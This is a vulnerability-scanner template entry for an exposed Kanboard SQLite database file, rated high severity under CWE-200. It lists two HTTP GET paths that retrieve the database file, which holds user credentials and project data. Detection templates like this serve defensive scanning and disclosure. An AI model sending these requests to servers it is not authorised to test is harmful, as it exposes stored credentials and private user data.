# Nuclei Template: Kanboard - SQLite Database Exposure
**Template ID:** kanboard-database-exposure
**Vulnerability Class:** Information Disclosure
**Severity:** High
**CWE:** CWE-200
**Source:** Nuclei Template (`kanboard-database-exposure.yaml`)

## Vulnerability Information & PoC

## Description
Detected Kanboard SQLite database file was found to be exposed, containing sensitive information including user credentials, project data, tasks, and comments.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/data/db.sqlite
GET {{BaseURL}}/kanboard/data/db.sqlite
```

## References
- https://docs.kanboard.org/v1/admin/sqlite/
- https://kanboard.org/
